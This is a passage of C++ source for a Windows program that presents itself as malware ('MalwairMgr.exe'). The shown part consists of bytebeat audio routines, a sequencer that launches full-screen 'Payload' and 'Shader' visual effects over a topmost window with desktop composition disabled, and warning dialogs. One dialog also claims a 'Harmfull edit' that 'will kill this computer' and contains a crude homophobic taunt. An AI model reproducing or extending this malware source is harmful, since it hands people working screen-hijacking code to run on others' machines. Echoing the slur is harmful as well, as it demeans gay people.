    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = { 0 };
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t * cos(t >> 12 | t));
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
void sound12() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = { 0 };
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>((t * 3 * (t >> 3 | t >> 5) & t >> 5) - 1 | t << 2 & (t * (t >> 13 | t >> 4) | t >> 13));
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
void sound13() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 11025, 11025, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[11025 * 30] = { 0 };
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(((t & t >> 12) * (t >> 5 | t >> 7) ^ (t >> 5 | t >> 7)) & 100 | 30000 / (t % 4096 + 1) | t);
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
void sound14() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = { 0 };
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>((int)(1.0 + cos((double)(0x78917891 >> (t >> 8) ^ t * 0xa7789))) * t >> (t >> 13));
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
void sound15() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = { 0 };
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>((int)tan(t >> t >> 10) | (t >> 9 | t * 2 | t * 8) & t * 4);
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
void sound16() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 32000, 32000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[32000 * 30] = { 0 };
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t >> 4 | t * 2 | t * 8 | t * 4 | t >> 6 | t >> (t >> 16));
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
void sound17() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = { 0 };
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>((int)tan(t & 875 | t >> 4) << (int)(sin(t ^ 4 | t & 8) * 2.0));
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
void sound18() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = { 0 };
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>((int)tan(t ^ 7) * ((t + 100) / 100) & 0x78917891 >> (t >> 8) | t << 2);
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
void sound19() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = { 0 };
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(sin(t >> (t & 32768 ? 3 : 5) | t >> (t & 32768 ? 6 : 8)) * 3.2 * t);
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
void sound20() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 22050, 22050, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[22050 * 30] = { 0 };
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>((t * 6 & t >> 7 | t * 4 & t >> 8 | t * 5 & t >> 10) - rand() % 50);
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
void sound21() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = { 0 };
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(64 ^ (t >> 4 | t >> 5 | t) & (t >> 6 ^ t >> 4 | t) + 1);
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
void sound22() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 32000, 32000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[32000 * 30] = { 0 };
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(250 * (t >> 4) | t >> 4 ^ t | t << 3);
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
void sound23() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 11025, 11025, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[11025 * 30] = { 0 };
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>((int)(cos(t >> 4 | t) * ((t >> 100) / 100 + 112)) ^ t >> 8);
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
void sound24() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 4000, 4000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[4000 * 30] = { 0 };
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t ^ t >> t);
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
void sound25() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = { 0 };
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(tan(t * ((t >> 5 | t) >> (t >> 15))));
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
void sound26() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 44100, 44100, WAVE_FORMAT_PCM, 8, 0 };
    waveOutOpen(&hWaveOut, 0, &wfx, 0, 0, 0);
    char* buffer = new char[44100 * 30];
    for (LONGLONG t = 0; t < 44100 * 30; t++)
        buffer[t] = ((t / 4 * ((t >> 12 ^ (t >> 12) - 2) % 11) | t >> 13) & 127) + (t / 4 * (0x7024afde >> (t >> 11 & 28) & 15) & 128);
    WAVEHDR header = { buffer, 44100 * 30, 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
void sound27() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = { 0 };
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>((t * 5 * (t * 5 >> 6 & t * 5 >> 7) & t >> 8) - 1);
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
void sound28() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = { 0 };
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t * ("139871239470789"[t >> 10 & 10]) | t * (t * 3 >> 4) | t * (t * 2 >> 4) | t * (t >> 4));
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
void sound29() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = { 0 };
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>((0xdeaddead * (t * 3 >> 4 | (int)tan(t * t >> 4 | 7)) & (t * 3 >> 8 & t * 3 >> 5 & t * 3 >> 3 & t * 3 >> 0xdeaddead)) - 1 - t % (1 + rand() % 29));
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
void sound30() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = { 0 };
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>((int)tan(t >> 2 | t >> 4) * rand() | t >> rand() % 25);
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
void SPtime() {
    Sleep(30000);
}
void clean() {
    SetWindowPos(GDIWindow, HWND_TOPMOST, 0, 0, 0, 0, SWP_HIDEWINDOW | SWP_NOMOVE | SWP_NOSIZE | SWP_NOACTIVATE);
    ShowWindow(GDIWindow, SW_HIDE);
    RedrawWindow(GDIWindow, NULL, NULL, RDW_ERASE | RDW_INVALIDATE | RDW_FRAME | RDW_ALLCHILDREN);
    HDC hdc = GetDC(0), hcdc = CreateCompatibleDC(hdc);
    HBITMAP bmp = CreateCompatibleBitmap(hdc, GetSystemMetrics(0), GetSystemMetrics(1)), old = (HBITMAP)SelectObject(hcdc, bmp);
    BitBlt(hcdc, 0, 0, GetSystemMetrics(0), GetSystemMetrics(1), hdc, 0, 0, SRCCOPY);
    ReleaseDC(0, hdc);
    SetWindowPos(GDIWindow, HWND_TOPMOST, 0, 0, 0, 0, SWP_SHOWWINDOW | SWP_NOMOVE | SWP_NOSIZE | SWP_NOACTIVATE);
    ShowWindow(GDIWindow, SW_SHOW);
    hdc = GetDC(GDIWindow);
    BitBlt(hdc, 0, 0, GetSystemMetrics(0), GetSystemMetrics(1), hcdc, 0, 0, SRCCOPY);
    ReleaseDC(0, hdc); SelectObject(hcdc, old); DeleteObject(bmp); DeleteDC(hcdc);
    InvalidateRect(GDIWindow, 0, 1);
    InvalidateRect(0, 0, 0);
    UpdateWindow(GDIWindow);
    Sleep(100);
}
DWORD WINAPI RunSP(LPVOID lpParam) {
    clean();
    Sleep(100);
    sound1();
    HANDLE th1 = CreateThread(NULL, 0, Payload1a_Melt, NULL, 0, NULL);
    HANDLE fh1 = CreateThread(NULL, 0, Payload1b_Pie, NULL, 0, NULL);
    SPtime();
    TerminateThread(th1, 0);
    CloseHandle(th1);
    clean();
    sound2();
    HANDLE th2 = CreateThread(NULL, 0, Shader1_Rotate, NULL, 0, NULL);
    SPtime();
    TerminateThread(th2, 0);
    CloseHandle(th2);
    clean();
    sound3();
    HANDLE th3 = CreateThread(NULL, 0, Shader2_NoName1, NULL, 0, NULL);
    HANDLE fh2 = CreateThread(NULL, 0, Payload2_Icons1, NULL, 0, NULL);
    SPtime();
    TerminateThread(th3, 0);
    CloseHandle(th3);
    clean();
    sound4();
    HANDLE th4 = CreateThread(NULL, 0, Shader3_NoName2, NULL, 0, NULL);
    SPtime();
    TerminateThread(th4, 0);
    CloseHandle(th4);
    clean();
    sound5();
    HANDLE th5 = CreateThread(NULL, 0, Shader4_NoName3, NULL, 0, NULL);
    SPtime();
    TerminateThread(th5, 0);
    CloseHandle(th5);
    clean();
    sound6();
    HANDLE th6 = CreateThread(NULL, 0, Shader5_NoName4, NULL, 0, NULL);
    SPtime();
    TerminateThread(th6, 0);
    CloseHandle(th6);
    clean();
    sound7();
    HANDLE th7 = CreateThread(NULL, 0, Shader6_NoName5, NULL, 0, NULL);
    SPtime();
    TerminateThread(th7, 0);
    CloseHandle(th7);
    clean();
    sound8();
    HANDLE th8 = CreateThread(NULL, 0, Shader7_NoName6, NULL, 0, NULL);
    SPtime();
    TerminateThread(th8, 0);
    CloseHandle(th8);
    clean();
    sound9();
    HANDLE th9 = CreateThread(NULL, 0, Shader8_NoName7, NULL, 0, NULL);
    SPtime();
    TerminateThread(th9, 0);
    TerminateThread(fh1, 0);
    CloseHandle(th9);
    CloseHandle(fh1);
    clean();
    sound10();
    HANDLE fh3 = CreateThread(NULL, 0, Payload3_Cube, NULL, 0, NULL);
    HANDLE fh4 = CreateThread(NULL, 0, Payload5_Text, NULL, 0, NULL);
    HANDLE th10 = CreateThread(NULL, 0, Payload4_BlackBgr, NULL, 0, NULL);
    SPtime();
    TerminateThread(th10, 0);
    CloseHandle(th10);
    clean();
    sound11();
    HANDLE th11 = CreateThread(NULL, 0, Shader9_NoName8, NULL, 0, NULL);
    SPtime();
    TerminateThread(th11, 0);
    CloseHandle(th11);
    clean();
    sound12();
    HANDLE th12 = CreateThread(NULL, 0, Shader10_NoName9, NULL, 0, NULL);
    SPtime();
    TerminateThread(th12, 0);
    CloseHandle(th12);
    clean();
    sound13();
    HANDLE th13 = CreateThread(NULL, 0, Shader11_NoName10, NULL, 0, NULL);
    SPtime();
    TerminateThread(th13, 0);
    CloseHandle(th13);
    clean();
    sound14();
    HANDLE th14 = CreateThread(NULL, 0, Shader12_NoName11, NULL, 0, NULL);
    SPtime();
    TerminateThread(th14, 0);
    CloseHandle(th14);
    clean();
    sound15();
    HANDLE th15 = CreateThread(NULL, 0, Shader13_NoName12, NULL, 0, NULL);
    SPtime();
    TerminateThread(th15, 0);
    CloseHandle(th15);
    clean();
    sound16();
    HANDLE th16 = CreateThread(NULL, 0, Shader14_NoName13, NULL, 0, NULL);
    SPtime();
    TerminateThread(th16, 0);
    CloseHandle(th16);
    clean();
    sound17();
    HANDLE th17 = CreateThread(NULL, 0, Shader15_NoName14, NULL, 0, NULL);
    SPtime();
    TerminateThread(th17, 0);
    CloseHandle(th17);
    clean();
    sound18();
    HANDLE th18 = CreateThread(NULL, 0, Shader16_NoName15, NULL, 0, NULL);
    SPtime();
    TerminateThread(th18, 0);
    CloseHandle(th18);
    clean();
    sound19();
    HANDLE th19 = CreateThread(NULL, 0, Shader17_NoName16, NULL, 0, NULL);
    SPtime();
    TerminateThread(th19, 0);
    CloseHandle(th19);
    clean();
    sound20();
    HANDLE th20 = CreateThread(NULL, 0, Shader18_NoName17, NULL, 0, NULL);
    SPtime();
    TerminateThread(th20, 0);
    CloseHandle(th20);
    clean();
    sound21();
    HANDLE th21 = CreateThread(NULL, 0, Shader19_NoName18, NULL, 0, NULL);
    SPtime();
    TerminateThread(th21, 0);
    CloseHandle(th21);
    clean();
    sound22();
    HANDLE th22 = CreateThread(NULL, 0, Shader20_NoName19, NULL, 0, NULL);
    SPtime();
    TerminateThread(th22, 0);
    CloseHandle(th22);
    clean();
    sound23();
    HANDLE th23 = CreateThread(NULL, 0, Shader21_NoName20, NULL, 0, NULL);
    SPtime();
    TerminateThread(th23, 0);
    CloseHandle(th23);
    clean();
    sound24();
    HANDLE th24 = CreateThread(NULL, 0, Shader22_NoName21, NULL, 0, NULL);
    SPtime();
    TerminateThread(th24, 0);
    CloseHandle(th24);
    clean();
    sound25();
    HANDLE th25 = CreateThread(NULL, 0, Shader23_NoName22, NULL, 0, NULL);
    SPtime();
    TerminateThread(th25, 0);
    CloseHandle(th25);
    clean();
    sound26();
    HANDLE th26 = CreateThread(NULL, 0, Shader24_NoName23, NULL, 0, NULL);
    SPtime();
    TerminateThread(th26, 0);
    CloseHandle(th26);
    clean();
    sound27();
    HANDLE th27 = CreateThread(NULL, 0, Shader25_NoName24, NULL, 0, NULL);
    SPtime();
    TerminateThread(th27, 0);
    CloseHandle(th27);
    clean();
    sound28();
    HANDLE th28 = CreateThread(NULL, 0, Shader26_NoName25, NULL, 0, NULL);
    SPtime();
    TerminateThread(th28, 0);
    CloseHandle(th28);
    clean();
    sound29();
    HANDLE th29 = CreateThread(NULL, 0, Shader27_NoName26, NULL, 0, NULL);
    SPtime();
    TerminateThread(th29, 0);
    CloseHandle(th29);
    clean();
    sound30();
    HANDLE th30 = CreateThread(NULL, 0, Shader28_Last, NULL, 0, NULL);
    SPtime();
    TerminateThread(th30, 0);
    TerminateThread(fh2, 0);
    TerminateThread(fh3, 0);
    TerminateThread(fh4, 0);
    CloseHandle(th30);
    CloseHandle(fh2);
    CloseHandle(th3);
    CloseHandle(th4);
    clean();
    SendMessage(GDIWindow, WM_DESTROY, 0x7891, 0);
    ExitProcess(0);
}
void StartMalware() {
    WNDCLASSEXW wcex = { 0 };
    wcex.cbSize = sizeof(WNDCLASSEX); wcex.cbClsExtra = 0; wcex.cbWndExtra = 0;
    wcex.lpfnWndProc = WndProc;
    wcex.lpszClassName = L"MalwairMgr.exe-GDI effect window";
    RegisterClassExW(&wcex);
    HWND hwnd = CreateWindowExW(WS_EX_TOOLWINDOW | WS_EX_LAYERED | WS_EX_TOPMOST | WS_EX_TRANSPARENT, wcex.lpszClassName, L"MalwairMgr.exe - GDI effect window", WS_CLIPSIBLINGS | WS_POPUP | WS_DISABLED | WS_MAXIMIZE, 0, 0, GetSystemMetrics(0), GetSystemMetrics(1), nullptr, nullptr, 0, nullptr);
    if (!hwnd && !IsWindow(hwnd)) { return; }
    SetLayeredWindowAttributes(hwnd, 0, 255, LWA_ALPHA);
    UpdateWindow(hwnd);
    GDIWindow = hwnd;
    DwmEnableComposition(0);
    CreateThread(0, 0, RunSP, 0, 0, 0);
    MSG msg;
    while (GetMessage(&msg, nullptr, 0, 0)) {
        if (!TranslateAccelerator(msg.hwnd, NULL, &msg)) {
            TranslateMessage(&msg);
            DispatchMessage(&msg);
        }
    }
}
int main() {
    SetProcessDPIAware();
    srand(time(NULL));
    LPCWSTR MessageTextFirst = L"Warning!!!\n\nDo you want to run me??I am a malware!Please do not run my Harmfull edit on your important computer if you want to live.I AM NOT TALKING A JOKE!!THIS IS REAL.And I must tell you something is quite important:DO NOT run my Harmfull edit on PUBLIC OR IMPORTANT COMPUTER!!If you want run my Harmfull edit,you can run my Harmfull edit on VM or not important computer.DO NOT COPY MY CODE IF YOU DO NOT WANT TO BE A GAY AND KILL YOUR PARANTS!!!!!!\n\nby github@uiui-sod  bilibili@uiui-RuYiShiQu";
    LPCWSTR MessageTextSecond = L"Last warning\n\nWell you maybe still do not know what is happening,and I will tell you:You just run a malware(me),If you want to continue,click Yes button,else click No button.Malware is an APP,there has two edit,first is Harmfull,it will kill this computer,second is Harmless,it will not kill the system but little break the CPU.So,can you decide??";
    if (MessageBoxW(0, MessageTextFirst, L"MalwairMgr.exe-warning", MB_ICONWARNING + MB_YESNO + MB_DEFBUTTON2) == IDNO) { ExitProcess(0); }
    else {
        HANDLE NoN17Pro = CreateThread(NULL, 0, ErrorConsole, NULL, 0, NULL);
        if (MessageBoxW(0, MessageTextSecond, L"MalwairMgr.exe-last warning", MB_ICONWARNING + MB_YESNO + MB_DEFBUTTON2) == IDNO) { TerminateThread(NoN17Pro, 0); ExitProcess(0); }
        else {
            TerminateThread(NoN17Pro, 0);
            FreeConsole();
            StartMalware();
        }
    }
    return 0;
}